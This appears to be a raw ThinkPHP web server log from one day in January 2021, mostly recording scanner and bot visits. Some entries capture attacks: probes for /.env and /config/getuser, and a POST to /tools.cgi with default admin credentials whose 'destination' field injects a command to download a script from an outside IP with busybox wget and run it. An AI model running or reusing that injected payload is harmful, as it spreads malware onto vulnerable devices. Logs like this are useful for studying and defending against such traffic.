---------------------------------------------------------------
[ 2021-01-17T00:12:16+08:00 ] 151.243.107.89 GET 101.37.13.45/
[运行时间：0.024055s] [吞吐率：41.57req/s] [内存消耗：1,760.63kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '101.37.13.45',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T02:23:01+08:00 ] 85.93.152.58 GET 101.37.13.45:80/
[运行时间：0.016249s] [吞吐率：61.54req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T04:30:06+08:00 ] 92.38.45.250 GET 101.37.13.45:80/
[运行时间：0.016173s] [吞吐率：61.83req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T06:17:50+08:00 ] 107.6.162.34 GET 101.37.13.45/
[运行时间：0.015930s] [吞吐率：62.77req/s] [内存消耗：1,760.63kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T06:25:53+08:00 ] 167.114.43.107 GET 101.37.13.45/
[运行时间：0.016484s] [吞吐率：60.66req/s] [内存消耗：1,760.69kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T06:25:54+08:00 ] 167.114.43.107 GET 101.37.13.45/
[运行时间：0.015543s] [吞吐率：64.34req/s] [内存消耗：1,760.51kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'python-requests/2.25.1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T06:44:09+08:00 ] 190.97.238.10 GET 101.37.13.45:80/
[运行时间：0.027339s] [吞吐率：36.58req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T09:09:57+08:00 ] 198.20.124.218 GET 101.37.13.45/
[运行时间：0.016448s] [吞吐率：60.80req/s] [内存消耗：1,760.65kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T09:48:16+08:00 ] 40.89.139.128 GET 101.37.13.45/.env
[运行时间：0.017912s] [吞吐率：55.83req/s] [内存消耗：1,834.05kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '.env',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T09:48:17+08:00 ] 40.89.139.128 POST 101.37.13.45/
[运行时间：0.015759s] [吞吐率：63.46req/s] [内存消耗：1,760.60kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '14',
)
[ info ] [ PARAM ] array (
  '0x' => 
  array (
    0 => 'bitch',
  ),
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T09:49:20+08:00 ] 83.97.20.31 GET 101.37.13.45:80/
[运行时间：0.016903s] [吞吐率：59.16req/s] [内存消耗：1,759.98kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T11:05:46+08:00 ] 47.242.223.125 GET 101.37.13.45/
[运行时间：0.016894s] [吞吐率：59.19req/s] [内存消耗：1,760.30kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T12:57:43+08:00 ] 209.141.60.195 GET 101.37.13.45:80/config/getuser?index=0
[运行时间：0.018292s] [吞吐率：54.67req/s] [内存消耗：1,835.23kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'config',
    1 => 'getuser',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  'index' => '0',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T13:02:22+08:00 ] 89.248.170.31 GET 101.37.13.45:80/
[运行时间：0.015234s] [吞吐率：65.64req/s] [内存消耗：1,761.23kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Linux Gnu (cow)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T15:01:05+08:00 ] 89.248.170.31 POST 101.37.13.45:80/tools.cgi
[运行时间：0.017563s] [吞吐率：56.94req/s] [内存消耗：1,836.28kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'tools.cgi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic YWRtaW46YWRtaW4=',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Linux Gnu',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'origin' => 'http://101.37.13.45:80',
  'connection' => 'close',
  'referer' => 'http://101.37.13.45:80/tools.cgi',
  'upgrade-insecure-requests' => '1',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '129',
)
[ info ] [ PARAM ] array (
  'op_type' => 'ping',
  'destination' => ';cd /tmp;rm rf usb;busybox wget http://45.10.24.65/script/usb;chmod 777 usb;sh usb',
  'user_options' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T16:49:47+08:00 ] 89.248.170.31 GET 101.37.13.45:80/
[运行时间：0.017140s] [吞吐率：58.34req/s] [内存消耗：1,761.38kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'referer' => 'http://101.37.13.45:80/left.html',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T17:17:39+08:00 ] 109.63.180.130 GET 101.37.13.45:80/
[运行时间：0.016813s] [吞吐率：59.48req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T17:38:28+08:00 ] 183.136.225.42 GET 101.37.13.45:80/
[运行时间：0.015720s] [吞吐率：63.61req/s] [内存消耗：1,760.34kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T17:38:28+08:00 ] 183.136.225.42 GET 101.37.13.45:80/
[运行时间：0.018844s] [吞吐率：53.07req/s] [内存消耗：1,760.63kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T17:45:21+08:00 ] 167.248.133.55 GET 101.37.13.45:80/
[运行时间：0.015501s] [吞吐率：64.51req/s] [内存消耗：1,759.83kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T17:45:21+08:00 ] 167.248.133.55 GET 101.37.13.45/
[运行时间：0.015707s] [吞吐率：63.67req/s] [内存消耗：1,760.22kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T18:42:06+08:00 ] 192.241.224.82 GET 101.37.13.45/hudson
[运行时间：0.017239s] [吞吐率：58.01req/s] [内存消耗：1,833.39kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hudson',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T18:42:14+08:00 ] 151.234.67.74 GET 101.37.13.45:80/
[运行时间：0.017204s] [吞吐率：58.13req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T20:40:27+08:00 ] 128.14.134.170 GET 101.37.13.45/
[运行时间：0.015334s] [吞吐率：65.22req/s] [内存消耗：1,760.65kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T20:53:06+08:00 ] 34.78.227.165 GET 101.37.13.45/
[运行时间：0.016379s] [吞吐率：61.05req/s] [内存消耗：1,761.23kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'python-requests/2.25.1',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'x-datadog-trace-id' => '11039206863360585518',
  'x-datadog-parent-id' => '3043235876861623636',
  'x-datadog-sampling-priority' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T22:51:03+08:00 ] 45.14.224.26 GET 101.37.13.45:80/config/getuser?index=0
[运行时间：0.017931s] [吞吐率：55.77req/s] [内存消耗：1,835.23kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'config',
    1 => 'getuser',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  'index' => '0',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-17T23:11:43+08:00 ] 178.210.17.63 GET 101.37.13.45:80/
[运行时间：0.017439s] [吞吐率：57.34req/s] [内存消耗：1,760.33kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
